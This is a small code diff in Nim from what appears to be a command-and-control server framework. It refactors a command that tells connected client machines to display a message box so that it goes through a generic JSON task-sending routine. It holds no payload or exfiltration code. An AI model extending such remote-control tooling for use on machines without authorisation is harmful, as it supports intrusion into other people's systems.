@@ -1,8 +1,6 @@
-import asyncdispatch, strutils, tables
+import asyncdispatch, tables, json
 
-import ../../types, ../../logging
-
-import ../../../clientTasks/msgbox
+import ../../types, ../../logging, ../../communication
 
 proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
   if len(args) < 2:
@@ -10,7 +8,7 @@ proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: T
     return
   
   for client in server.cli.handlingClient:
-    discard await msgbox.sendTask(client, args[1], args[0])
+    discard await client.sendClientTask("msgbox", %*[ args[0], args[1] ])
 
 let cmd*: Command = Command(
   execProc: execProc,
